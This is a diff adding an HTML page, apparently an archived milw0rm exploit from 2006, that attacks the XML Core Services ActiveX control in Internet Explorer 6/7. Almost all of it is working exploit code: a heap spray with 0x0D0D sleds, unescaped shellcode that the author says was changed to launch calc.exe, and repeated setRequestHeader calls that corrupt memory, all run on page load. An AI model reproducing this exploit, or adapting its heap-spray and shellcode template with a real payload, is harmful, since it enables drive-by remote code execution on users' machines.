@@ -1,0 +1,68 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1 plus 2.0//EN">
+<!--
+MS Internet Explorer 6/7 (XML Core Services)  Remote Code Execution Exploit
+
+Author: n/a
+
+Info:
+http://blogs.securiteam.com/index.php/archives/721
+http://isc.sans.org/diary.php?storyid=1823
+http://xforce.iss.net/xforce/alerts/id/239
+
+Found in the wild and was pointed out on securiteam's blog (cheers Gadi Evron!)
+
+Changed up the shellcode so it wouldn't be as evil for the viewers, calc.exe is called.
+
+/str0ke
+-->
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<body>
+<object id=target classid="CLSID:{88d969c5-f192-11d4-a65f-0040963251e5}" >
+</object>
+<script>
+var obj = null;
+function exploit() {
+obj = document.getElementById('target').object;
+
+try {
+obj.open(new Array(),new Array(),new Array(),new Array(),new Array());
+} catch(e) {};
+
+sh = unescape ("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090" +
+	"%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120" +
+	"%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424" +
+	"%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304" +
+	"%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0" +
+	"%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A" +
+	"%uFF57%u63E7%u6C61%u0063");
+
+sz = sh.length * 2;
+npsz = 0x400000-(sz+0x38);
+nps = unescape ("%u0D0D%u0D0D");
+while (nps.length*2<npsz) nps+=nps;
+ihbc = (0x12000000-0x400000)/0x400000;
+mm = new Array();
+for (i=0;i<ihbc;i++) mm[i] = nps+sh;
+
+obj.open(new Object(),new Object(),new Object(),new Object(), new Object());    
+
+obj.setRequestHeader(new Object(),'......');
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+obj.setRequestHeader(new Object(),0x12345678);
+}
+</script>
+<body onLoad='exploit()' value='Exploit'>
+
+</body></html>
+
+# milw0rm.com [2006-11-08]
